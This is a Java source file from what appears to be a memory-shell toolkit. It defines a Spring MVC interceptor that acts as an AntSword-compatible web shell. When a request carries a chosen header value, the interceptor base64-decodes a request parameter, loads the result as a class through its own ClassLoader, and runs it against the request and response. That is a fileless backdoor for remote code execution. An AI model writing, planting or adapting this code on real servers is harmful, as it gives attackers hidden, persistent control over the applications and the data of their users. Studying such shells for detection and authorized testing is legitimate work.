package com.reajason.javaweb.memshell.shelltool.antsword;

import org.springframework.web.servlet.AsyncHandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 * @author ReaJason
 * @since 2025/02/18
 */
public class AntSwordInterceptor extends ClassLoader implements AsyncHandlerInterceptor {
    public static String pass;
    public static String headerName;
    public static String headerValue;

    public AntSwordInterceptor() {
    }

    public AntSwordInterceptor(ClassLoader c) {
        super(c);
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
            try {
                byte[] bytes = base64Decode(request.getParameter(pass));
                Object instance = (new AntSwordInterceptor(Thread.currentThread().getContextClassLoader())).defineClass(bytes, 0, bytes.length).newInstance();
                instance.equals(new Object[]{request, response});
            } catch (Throwable e) {
                e.printStackTrace();
            }
            return false;
        } else {
            return true;
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {

    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {

    }

    @Override
    public void afterConcurrentHandlingStarted(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {

    }
}
